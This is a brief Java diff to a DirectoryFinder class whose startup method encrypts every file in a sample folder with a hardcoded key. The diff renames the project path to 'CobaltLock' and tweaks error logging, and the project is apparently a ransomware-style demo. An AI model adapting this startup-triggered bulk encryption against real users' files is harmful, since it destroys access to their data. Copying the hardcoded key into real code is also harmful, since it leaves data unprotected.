@@ -9,7 +9,7 @@ public class DirectoryFinder {
 
     // Called on app startup to encrypt all target files
     public static void encryptAllFiles() {
-        File inputFolder = new File("JavaSwing/src/main/ExampleFiles");
+        File inputFolder = new File("CobaltLock/src/main/ExampleFiles");
         File[] files = inputFolder.listFiles();
 
         if (files == null || files.length == 0) {
@@ -22,8 +22,8 @@ public class DirectoryFinder {
                 String encryptedPath = file.getAbsolutePath() + ".encrypted";
                 encryptFile("1234567812345678", file.getAbsolutePath(), encryptedPath);
             } catch (Exception e) {
+                System.err.println("Exception occurred: " + e.getMessage());
                 System.err.println("Failed to encrypt: " + file.getName());
-                e.printStackTrace();
             }
         }
     }
